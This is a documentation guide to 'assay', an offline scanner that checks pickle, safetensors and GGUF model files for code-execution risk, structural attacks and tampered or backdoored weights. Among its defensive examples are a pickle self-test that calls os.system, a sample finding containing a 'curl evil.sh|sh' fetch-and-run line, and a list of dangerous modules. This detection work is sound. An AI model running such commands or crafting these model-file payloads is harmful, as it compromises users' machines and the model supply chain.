# `assay` for dummies 🧪

> The complete, illustrated guide to how `assay` works, from the first byte read
> to the drift graph. No prerequisites: everything is explained.

---

## 0. What is `assay`, in one sentence?

`assay` is a **security scanner for ML model files** (`safetensors`, `GGUF`,
PyTorch pickle). You download a 5 GB model off the internet and run it with total
trust… yet you'd never do that with a random `.exe`. `assay` applies to the model
the same hygiene you'd apply to any unknown binary.

> **Metaphor.** In metallurgy, an *assay* tests the purity and composition of a
> metal. A model is literally *weights*. `assay` tests whether those weights are
> **pure** (no contaminant) and **authentic** (real provenance).

Two questions, two halves:

```
┌─────────────────────────────────────────────────────────────────┐
│  1. Is this file what it claims to be?               → PHASE 1   │
│     (provenance & integrity, deterministic VERDICTS)             │
│                                                                   │
│  2. Does loading it put my machine at risk?          → PHASE 1   │
│     (format-level safety)                                        │
│                                                                   │
│  3. Are the weights themselves anomalous?            → PHASE 2   │
│     (statistical analysis, SIGNALS, never verdicts)             │
└─────────────────────────────────────────────────────────────────┘
```

**Golden rules** (true everywhere in `assay`):

- 🔒 **Offline.** No network calls during a scan.
- 📦 **One static binary**, zero runtime deps. No Python, no PyTorch, no ONNX.
- 🚫 **NEVER loads the model.** Bytes are read cold. Nothing is instantiated, no
  forward pass is run.
- 🌊 **Streaming / mmap.** The whole model is never held in RAM (a 70B wouldn't
  fit).
- 🎯 **Deterministic.** Same file in → same bytes out.

---

## 1. The overall pipeline

```
                    assay scan ./model/
                          │
                          ▼
            ┌─────────────────────────────┐
            │  Walk the directory         │   finds *.safetensors / *.gguf
            │  collect_artifacts()        │   / *.bin / *.pt / *.pkl …
            └─────────────┬───────────────┘
                          │  (one artifact at a time)
                          ▼
            ┌─────────────────────────────┐
            │  mmap the file              │   ← never fs::read a 70B
            │  map_file()  [mapio.rs]     │
            └─────────────┬───────────────┘
                          ▼
            ┌─────────────────────────────┐
            │  Format detection           │   magic bytes first,
            │  detect()    [format.rs]    │   extension is only a hint
            └─────────────┬───────────────┘
                          ▼
        ┌─────────────────┼─────────────────┐
        ▼                 ▼                 ▼
   ┌─────────┐      ┌────────────┐    ┌─────────┐
   │ pickle  │      │safetensors │    │  GGUF   │     ◄── PHASE 1
   │ scanner │      │ validator  │    │validator│         (always on)
   └────┬────┘      └─────┬──────┘    └────┬────┘
        └─────────────────┼────────────────┘
                          ▼
            ┌─────────────────────────────┐
            │  Signature verification     │   [signature.rs]
            └─────────────┬───────────────┘
                          ▼
              ╔═══════════════════════════╗
              ║  --deep ?                 ║
              ╚═════════════╤═════════════╝
                   no  │    │ yes
                       │    ▼
                       │   ┌─────────────────────────┐
                       │   │ PHASE 2 (weight analysis)│  [phase2.rs]
                       │   │  2a stats · 2b profile   │
                       │   │  2c secrets · 2d fingerprint
                       │   └────────────┬─────────────┘
                       ▼                ▼
            ┌─────────────────────────────┐
            │  Report + exit code         │   human (color) / JSON
            └─────────────────────────────┘
```

In parallel, a **real-time progress bar on stderr** (auto-disabled off a terminal
or with `--no-progress`):

```
[1/2] model.safetensors CLEAN no findings (0ms)
[2/2] pytorch_model.bin UNTRUSTED 2 finding(s) (1ms)
✓ scanned 2 artifact(s): 1 clean, 1 untrusted, 3.8 MiB in 2ms
```

> **Why stderr?** So `assay scan … --json | jq` stays **clean**: the report goes
> to stdout, the progress "noise" to stderr.

---

## 2. PHASE 1: Provenance & integrity (verdicts)

Phase 1 is **always on**. It produces deterministic, high-confidence **VERDICTS**.
No fuzzy statistics: either a pickle can execute code, or it can't.

### The possible verdicts

```
CLEAN      ✅  nothing suspicious at the format level
UNTRUSTED  ⚠️  can execute code / unreviewed injection surface
MALFORMED  💥  cannot be parsed as the format it claims to be
ERROR      ❌  internal error (I/O, etc.)
```

### The exit codes (for CI)

```
┌──────┬──────────────────────────────────────────────┐
│ code │ meaning                                       │
├──────┼──────────────────────────────────────────────┤
│  0   │ clean, nothing at/above the --fail-on level   │
│  1   │ findings at/above --fail-on severity          │
│  2   │ unreadable / malformed artifact (parse fail)  │
│  3   │ internal error                                 │
└──────┴──────────────────────────────────────────────┘
       precedence: 3 > 2 > 1 > 0  (worst outcome wins)
```

In CI:

```sh
assay scan ./models/ --json --fail-on high | tee report.json
# exit ≠ 0  →  the merge is blocked
```

---

### 2.1 Format detection (refuses to guess)

We look at the **head bytes**, not just the extension:

```
Head byte(s)              →  Format
──────────────────────────────────────────────
"GGUF"  (47 47 55 46)     →  GGUF
"PK\x03\x04"              →  pickle (torch zip container!)
0x80 …                    →  pickle (protocol ≥ 2)
<u64 len> then '{'        →  safetensors
.bin/.pt/.ckpt/.pkl       →  pickle (extension hint)
otherwise                 →  unknown → MALFORMED
```

> A repo mixing `safetensors` **and** pickle is itself a signal.

---

### 2.2 Pickle / code-execution risk ⚡ (priority #1)

**The problem.** Python's pickle format can **execute arbitrary code at load
time** (`torch.load`). That's exactly why `safetensors` exists. A `.bin`/`.pt`/
`.ckpt` is therefore *untrusted by design*.

**What `assay` does: it does NOT execute it.** It disassembles the opcode stream
cold and looks for dangerous patterns.

```
   pickle  =  a tiny stack machine with opcodes
   ─────────────────────────────────────────────────────
   bytes :   80 02 c os\n system\n 85 R .
              │  │  └── GLOBAL  → imports  os.system
              │  └───── proto 2
              └──────── PROTO
                                  85 = TUPLE1
                                  R  = REDUCE  ← CALLS the callable!
                                  .  = STOP
```

The scanner tracks:

```
GLOBAL / STACK_GLOBAL   → which function is imported?  (os.system, …)
REDUCE / INST / OBJ     → is a callable actually invoked?
NEWOBJ / BUILD
```

"Dangerous" modules flagged: `os`, `posix`, `subprocess`, `sys`, `socket`,
`shutil`, `ctypes`, `builtins.eval/exec/__import__`, …

**Example: the EICAR-style self-test** (a benign pickle that runs `echo`):

```sh
python3 - <<'PY'
import pickle, os
class Probe:
    def __reduce__(self):
        return (os.system, ("echo assay-detection-selftest",))
pickle.dump(Probe(), open("selftest.pkl","wb"))
PY
assay scan ./selftest.pkl --fail-on high
```

Output:

```
selftest.pkl  [pickle]  -> UNTRUSTED
  [high] PICKLE_RCE_RISK: pickle artifact can execute code at load time
      - opcode STACK_GLOBAL -> posix.system
      - execution opcodes: REDUCE
exit=1
```

> 💡 `os.system` is honestly reported as `posix.system`: that's what `os.system`
> *becomes* at the pickle level on Linux/macOS. `assay` reports the truth of the
> stream.

**Torch container (zip).** A `pytorch_model.bin` is often a **zip** containing
`archive/data.pkl`. `assay` opens the zip and scans the pickle inside:

```
pytorch_model.bin  [pickle]  -> UNTRUSTED
  [high] PICKLE_RCE_RISK: pickle artifact can execute code at load time
      - archive/data.pkl: execution opcodes: REDUCE
  [info] SAFE_ALTERNATIVE_AVAILABLE: a safetensors artifact is present; prefer it
```

Pickle findings:
`PICKLE_RCE_RISK` (high), `PICKLE_GLOBAL_REF` (medium), `PICKLE_UNTRUSTED`
(medium), `PICKLE_TRUNCATED` (medium), `SAFE_ALTERNATIVE_AVAILABLE` (info).

---

### 2.3 safetensors structural validation

`safetensors` is **safe by design** (no code), but still has format-level attack
surface: overlapping or out-of-bounds offsets → out-of-bounds reads / DoS at
load time.

**Anatomy of a safetensors file:**

```
┌────────────┬──────────────────────────┬───────────────────────────┐
│ 8 bytes    │  JSON header             │  data segment             │
│ u64 (LE)   │  { "weight": {           │  ███████████████████████  │
│ = header   │      "dtype":"F32",      │  ▲         ▲              │
│   length   │      "shape":[2,2],      │  │ tensor0 │ tensor1 …    │
│            │      "data_offsets":[0,16]│  begin     end           │
│            │  }, … }                  │                           │
└────────────┴──────────────────────────┴───────────────────────────┘
              └── data_start = 8 + len(header) ──┘
```

`assay` validates, for **each** tensor:

```
✓ begin ≤ end
✓ end ≤ data segment size                  else → ST_OFFSET_OOB     (high)
✓ no overlap between tensors               else → ST_OFFSET_OVERLAP (high)
✓ dtype_size × Π(shape) == end − begin     else → ST_DTYPE_SHAPE_MISMATCH
✓ header = valid JSON & consistent length  else → ST_HEADER_MALFORMED → MALFORMED
```

Diagram of an **overlap** (attack):

```
tensor A : [0 ─────── 4]
tensor B :       [2 ─────── 6]        ← B starts before A ends
                 ▲
                 ST_OFFSET_OVERLAP
```

And the check that valid offsets alone do **not** give you: every byte of the
data segment must belong to a tensor.

```
declared : [ tensor a ]              [ tensor b ]
file     : [ tensor a ][ ??? 64 B ???][ tensor b ]
                       ▲
                       claimed by nobody, read by nobody,
                       not covered by the manifest hash
                       -> ST_UNREFERENCED_BYTES
```

Every offset above is in bounds, ordered, and non-overlapping. The file is
valid. It also carries 64 bytes of whatever the author wanted. `assay` reports
the region with its absolute offsets and an escaped preview, and raises the
severity to high when those bytes start with a recognizable signature:

```
[high] ST_UNREFERENCED_BYTES: 64 byte(s) between tensors belong to no tensor
       (file offset 149) and begin with an ELF executable signature; ...
    - file offsets 149..213
    - first bytes: \x7fELFcurl evil.sh|sh\x00\x00\x00...
```

Zero-filled holes are reported too, at `low`: they are consistent with
alignment padding, so they do not condemn the file, but you still get told the
manifest hash does not cover them. The same accounting catches anything
appended after the last tensor, which is how a file gets to be a valid
safetensors *and* a valid ZIP at the same time.


---

### 2.4 GGUF sanity + chat-template flagging

GGUF (the llama.cpp / Ollama format) carries **no executable code**… but its
metadata can embed a **Jinja2 template** (`tokenizer.chat_template`), a
"code-ish" injection surface.

**GGUF anatomy:**

```
┌──────┬─────────┬────────────┬──────────┬───────────────┬─────────────┐
│"GGUF"│ version │tensor_count│ kv_count │  metadata     │ tensor infos│ data…
│ magic│  u32    │   u64      │   u64    │  KV (key→val) │ name/dims/  │ ████
│      │  (2/3)  │            │          │  …            │ type/offset │
└──────┴─────────┴────────────┴──────────┴───────────────┴─────────────┘
```

`assay`:
```
✓ magic + version (2 or 3)            else → GGUF_BAD_VERSION → MALFORMED
✓ each tensor offset ⊂ file           else → GGUF_OFFSET_OOB
⚑ key containing "chat_template"      →     GGUF_CHAT_TEMPLATE (low, review it)
```

Example:

```
model.gguf  [gguf]  -> CLEAN
  [low] GGUF_CHAT_TEMPLATE: embedded chat template present; review before trusting
      - tokenizer.chat_template: {{ messages }}…
```

> The template is **surfaced for human review**, never auto-trusted.

---

### 2.5 Deterministic hashing (the provenance anchor)

For `safetensors`, `assay` computes:

```
   per tensor :  blake3(raw tensor bytes)
   manifest   :  blake3( for each tensor sorted by name:
                         name ‖ dtype ‖ shape ‖ digest )
```

```
┌───────────────────────────────────────────────────────────┐
│  The manifest hash is STABLE:                             │
│  renaming the file or repacking the archive does NOT      │
│  change it: it depends only on tensor identity + content. │
│  This is your anchor to pin a model in CI.                │
└───────────────────────────────────────────────────────────┘
```

```json
"hashes": { "manifest": "blake3:4a31feadd70daefe…" }
```

---

### 2.6 Signature verification (the honest subset)

```
┌─────────────────────────────────────────────────────────────┐
│  What we ACTUALLY verify (offline, high confidence):        │
│   • model-transparency manifest: computed hash == recorded  │
│   • detached ed25519 signature : verified against --key     │
│                                                               │
│  What we DON'T pretend to do:                               │
│   • full Sigstore/cosign chain (Fulcio + Rekor)            │
│     → reported "unverified (sigstore)", NEVER "signed"       │
└─────────────────────────────────────────────────────────────┘
```

States: `unsigned`, `signed`, `signature-mismatch`, `unverified (sigstore)`.

```sh
assay verify ./model/ --bundle model.sig --key pub.key
```

```
model.safetensors  [safetensors]  -> CLEAN
  signature: signed
  [info] SIG_MANIFEST_MATCH: manifest hash matches the recorded transparency manifest
```

> "Honest confidence" principle: `signed` appears **only** on a real, successful
> cryptographic verification.

---

## 3. PHASE 2: Weight inspection (`--deep`)

```
        ╔══════════════════════════════════════════════════════╗
        ║  MINDSET SHIFT: read this twice                       ║
        ║                                                        ║
        ║  Phase 1 has external truth ("pickle = dangerous").   ║
        ║  Phase 2 inspects the WEIGHTS: there is NO external    ║
        ║  truth. A weight peak can be legitimate (over-         ║
        ║  represented concept) OR malicious (tampered).        ║
        ║  `assay` cannot tell which.                            ║
        ║                                                        ║
        ║  → Phase 2 emits SIGNALS with a score + severity,      ║
        ║    NEVER verdicts. A high score = "anomalous, worth a  ║
        ║    closer look", NEVER "malicious".                    ║
        ╚══════════════════════════════════════════════════════╝
```

Enabled with **`--deep`** (alias `--stats`). Phase 1 stays on and its verdict
**never** changes because of Phase 2.

```sh
assay scan ./model/ --deep              # per-tensor stats + profile
assay scan ./model/ --deep --profile    # + the per-layer sparkline
assay scan ./model/ --deep --svg p.svg  # + a 1D SVG chart
assay scan ./model/ --deep --mad-k 5.0  # tune the anomaly threshold
```

---

### 3.1 Per-tensor statistics (2a, the foundation)

For each tensor, in a **single streaming pass** (online algorithms, f64
accumulators, never the whole tensor in RAM):

```
integrity    : nan_count, inf_count          → WEIGHT_NAN_INF (high)
scale        : min, max, max_abs
distribution : mean, std (Welford)
              l2_norm, rms = l2/√n            (comparable across tensors)
              kurtosis (excess)              (heavy tails / outliers)
              sparsity = fraction of exact zeros
              outlier_mass = fraction |w| > 6·std
```

Why **Welford + M2/M3/M4 moments**? To compute mean/variance/kurtosis in a
streaming fashion **without** numerical blow-up (naive `Σx²` loses all precision
over billions of values).

`WEIGHT_NAN_INF` is the only "near-verdict" finding in Phase 2: weights should
**never** contain NaN/Inf (corruption or tampering).

```
model.safetensors -> CLEAN
  [high] WEIGHT_NAN_INF: tensor 'model.layers.0.w' contains 1 NaN and 0 Inf values
```

JSON (excerpt):

```json
"stats": { "per_tensor": [
  { "name":"output_norm.weight", "dtype":"F32", "quality":"full",
    "mean":2.51, "std":0.118, "kurtosis":129.0, "sparsity":0.0, "rms":2.51 }
]}
```

> **`quality`** is `full` (real stats) or `deferred_quantized` (see §3.5).

---

### 3.2 Per-layer profile + robust anomaly detection (2b)

We **group tensors into layers** by reading their names:

```
model.layers.<N>.…   (HF/llama)
transformer.h.<N>.…  /  h.<N>.…  (gpt2)
blk.<N>.…            (GGUF)
```

Per layer we aggregate: `l2` (combined norm), `mean_kurtosis`, `max_abs`,
`params`, `sparsity`.

**Anomaly detection: why MEDIAN + MAD and not mean + std?**

```
   Data: 9 normal layers + 1 tampered layer (huge)

   mean/std                       median/MAD (robust)
   ─────────────────             ──────────────────────
   the peak INFLATES the mean    the median ignores the peak
   AND the std → the threshold   the MAD stays small → the peak
   rises → the peak HIDES        is far above the threshold
        under its own threshold   → FLAGGED

   ❌ blind spot                  ✅ detected
```

> MAD = *Median Absolute Deviation* = median of |xᵢ − median|. A layer is flagged
> if it deviates by more than **`--mad-k`** MADs (default **5.0**).

Finding: `WEIGHT_OUTLIER_LAYER` (low/medium by magnitude), carrying the layer
index, the metric, and the deviation in MADs.

**The sparkline** (with `--profile`): each block = one layer, red = anomalous:

```
layer profile ▁▂▁▁▁▁▂▂▂▂▃▃▃▃▄▄▄▄▄▄▅▅▆▆▇██  (28 layers, metric=l2)
  min=401.36  max=494.55
  anomalous layers: 27
```

(real example on Mellum-12B Q2_K_S: the last layer stands out on `max_abs`.)

---

### 3.3 Secret & string scanning (2c)

Extends the chat-template flag into a general scan of metadata, GGUF KV blocks,
and sibling `config.json` / `tokenizer*.json` files:

```
URLs                         → SUSPICIOUS_URL (info)
known keys/tokens            → EMBEDDED_SECRET (severity = confidence)
  AKIA… (AWS), ghp_… (GitHub), xoxb-… (Slack), sk-…, AIza… (Google),
  -----BEGIN … PRIVATE KEY-----
generic high-entropy blob    → EMBEDDED_SECRET (low)
[experimental, --scan-tensor-entropy]
  whole-tensor region at near-max entropy → TENSOR_ENTROPY_ANOMALY (info)
```

Real example (mradermacher GGUFs embed the source URL):

```
  [info] SUSPICIOUS_URL: external URL referenced in general.source.url
      - https://huggingface.co/JetBrains/Mellum2-12B-A2.5B-Base
```

---

### 3.4 Architectural fingerprint (2d)

Derives a structural signature (naming scheme, layer count, hidden dim, heads,
vocab) and compares it to the declared identity:

```
ARCH_DETECTED  (info)   → detected family (llama / mistral / qwen / gemma / gpt2)
ARCH_MISMATCH  (medium) → "claims to be X but is structurally Y" (masked repackaging)
```

```
  [info] ARCH_DETECTED: structural fingerprint: gpt2 (gpt2)
      - layers=Some(12), hidden=None, heads=None, vocab=None
```

---

### 3.5 Quantized GGUF note (important)

```
┌──────────────────────────────────────────────────────────────────┐
│  Quantized GGUF tensors are BLOCK-encoded: the raw bytes are NOT  │
│  the weights. Computing stats on them = GARBAGE.                  │
│  You must DEQUANTIZE first.                                       │
│                                                                    │
│  ✅ dequantized (real stats): F32/F16/BF16,                        │
│     Q4_0, Q4_1, Q5_0, Q5_1, Q8_0  (legacy quants)                │
│                                                                    │
│  ⏸️  deferred (stats = null, structural info only):               │
│     Q2_K, Q3_K, Q4_K, Q5_K, Q6_K, Q8_K, IQ*   (k-quants)         │
│     → finding STATS_DEFERRED_QUANTIZED (info)                     │
└──────────────────────────────────────────────────────────────────┘
```

> Honesty > completeness: better nothing than a subtly-wrong k-quant decoder that
> would produce misleading stats. (k-quants are Phase 3 territory.)

A legacy block (e.g. Q4_0, 32 weights):

```
┌──────────┬────────────────────────────┐
│ d (f16)  │ 16 bytes = 32 nibbles      │   weight[i] = (nibbleᵢ − 8) × d
│ scale    │ (4-bit nibbles)            │
└──────────┴────────────────────────────┘
```

---

## 4. The `compare` command: differential analysis

```
        ╔══════════════════════════════════════════════════════╗
        ║  The Phase 2 profile ALONE sometimes flags layers as  ║
        ║  "anomalous" that are in fact LEGITIMATE (a well-      ║
        ║  trained transformer is naturally non-uniform).       ║
        ║                                                        ║
        ║  The real tampering signal is not a weight's absolute  ║
        ║  value: it is HOW this model DIFFERS from a known-     ║
        ║  good reference of the same architecture.              ║
        ╚══════════════════════════════════════════════════════╝
```

```sh
assay compare ./suspect-model/ ./known-good-model/
```

```
   Reference (baseline)  =  the zero line
   ───────────────────────────────────────────────────────────
   identical models          → total silence          (IDENTICAL)
   uniform fine-tune         → broad, even drift       → nothing flagged
   ONE tampered layer        → a single spike          → flagged there, nowhere else
```

### What `compare` computes, per tensor pair (streaming, lockstep)

```
cosine        = directional similarity              drift = 1 − cosine
rel_l2        = ‖S − B‖ / ‖B‖                        (relative magnitude of change)
changed_frac  = fraction of elements |Δ| > --epsilon
Δrms, Δstd, Δkurtosis, Δmax_abs
```

### The 4 steps

**1. Align by name, with canonicalization.** Same architecture, named
differently depending on how it was saved:

```
bare gpt2         :  h.0.attn.c_attn.weight        wte.weight
GPT2LMHeadModel   :  transformer.h.0.attn.c_attn…  transformer.wte.weight
                     └────────┬────────┘
                a "transformer." prefix on one side → SAME tensors!
```

We strip wrapper prefixes (`transformer.`, `model.`, `module.`, `_orig_mod.`)
**symmetrically on both sides** before aligning (but keep the original names for
display):

```
  normalized: stripped wrapper prefix from 14 baseline tensor name(s)
```

**2. Architecture guard.** Different families/layer counts (e.g. gpt2 12 layers
vs distilgpt2 6) → we **refuse** to emit drift (`ARCH_MISMATCH`, high). Use
`--force` to override (clearly labeled "unreliable").

**3. Drift + concentration.** We detect **concentration**, not total drift:
median + MAD on the per-layer `rel_l2`. A fine-tune moves everything a little (no
spike → quiet); a backdoor moves one region a lot (spike → flagged).

**4. Findings:**
```
STRUCTURAL_DIVERGENCE (high)  added/removed/reshaped tensor   ← near-verdict-grade
LAYER_DRIFT_OUTLIER   (l/m/h) layer with concentrated drift
TENSOR_DRIFT          (l/m/h) the tensor dominating that drift
TIED_WEIGHT           (info)  lm_head ↔ wte (weight tying, not a divergence)
IDENTICAL             (info)  drift ~0 everywhere (useful positive result)
```

### Example: a model vs itself (identity)

```
compare a.safetensors vs b.safetensors
  arch: gpt2 vs gpt2 (match)
  8 matched, 0 structural divergence(s), worst rel_l2: 0.0000
  drift profile ▁▁▁▁▁▁▁▁  (8 layers, metric=rel_l2)
    no anomalous layers
  [info] IDENTICAL: subject and baseline are identical across all matched tensors
```

### Example: a tampered layer (the "money test")

```
$ python make_tampered_gpt2.py gpt2/model.safetensors tampered/model.safetensors \
        --layer 5 --scale 4.0
$ assay compare ./tampered ./gpt2

  drift profile ▁▁▁▁▁█▁▁▁▁▁▁  (12 layers, metric=rel_l2)
                     ▲ layer 5 (red)
    anomalous layers: 5
  [high] LAYER_DRIFT_OUTLIER: layer 5 drift is a concentrated outlier (rel_l2=3.000)
  [high] TENSOR_DRIFT: tensor 'h.5.mlp.c_fc.weight' dominates the drift of layer 5
```

> Layers 3 and 11, the ones the profile **alone** falsely flagged, stay
> **silent** here: they don't move vs the baseline. *That's the whole point of
> the diff.*

---

## 5. CLI cheat sheet

```sh
# PHASE 1 (always on)
assay scan model.safetensors                 # one file
assay scan ./repo/                           # a directory (HF-style)
assay scan ./repo/ --json --fail-on high     # CI: JSON + non-zero exit
assay verify ./model/ --bundle m.sig --key pub.key

# PHASE 2 (--deep)
assay scan ./model/ --deep                   # per-tensor stats
assay scan ./model/ --deep --profile         # + per-layer sparkline
assay scan ./model/ --deep --svg prof.svg    # + 1D SVG chart
assay scan ./model/ --deep --mad-k 7.0       # anomaly threshold (default 5.0)
assay scan ./model/ --deep --scan-tensor-entropy   # [experimental]

# COMPARE (differential)
assay compare ./suspect/ ./baseline/
assay compare ./a/ ./b/ --json --svg drift.svg
assay compare ./a/ ./b/ --mad-k 5.0 --epsilon 1e-6
assay compare ./a/ ./b/ --force              # different archs (unreliable)

# Cross-cutting options
--color auto|always|never     # color (auto = TTY & no NO_COLOR)
--no-progress                 # silence the stderr progress bar
--fail-on info|low|medium|high|critical
```

### Severities

```
info < low < medium < high < critical
```

### The two-phase recap table

```
┌────────────────┬────────────────────────┬─────────────────────────────┐
│                │  PHASE 1               │  PHASE 2 (--deep)           │
├────────────────┼────────────────────────┼─────────────────────────────┤
│ Question       │ dangerous format?      │ anomalous weights?          │
│ Output         │ VERDICT (clean/untrust)│ SIGNALS (score + severity)  │
│ External truth │ YES (pickle = bad)     │ NO                          │
│ Confidence     │ high, deterministic    │ "worth a look", never accuse│
│ Reads weights? │ no (structure only)    │ yes, cold (never loaded)    │
│ On by default  │ yes                    │ no (--deep)                 │
└────────────────┴────────────────────────┴─────────────────────────────┘
```

---

## 6. The roadmap (where this is going)

```
Phase 1  ✅  provenance & integrity (verdicts)            ── shipped
Phase 2  ✅  weight inspection (signals)                  ── shipped
compare  ✅  differential analysis vs a baseline          ── shipped
─────────────────────────────────────────────────────────────────
k-quants 🔜  full dequantization (Q*_K)                   ── upcoming
Phase 3  🔬  GGUF quantization-error differential         ── research
            (= the same idea as `compare`, but the reference
             is the full-precision model, and the signal is
             the per-weight quantization error)
```

> Phase 3 = detect a payload that only activates **after** quantization.
> Conceptually it's `compare` applied to the pair (quantized model ↔
> full-precision model). Phase 2's dequant + streaming machinery and `compare`'s
> lockstep drift engine are the groundwork.

---

*Everything is offline, in a single binary. No model is ever loaded or executed.
Verdicts are deterministic; signals are honest about their confidence, and `assay`
never claims to detect what it can't.*
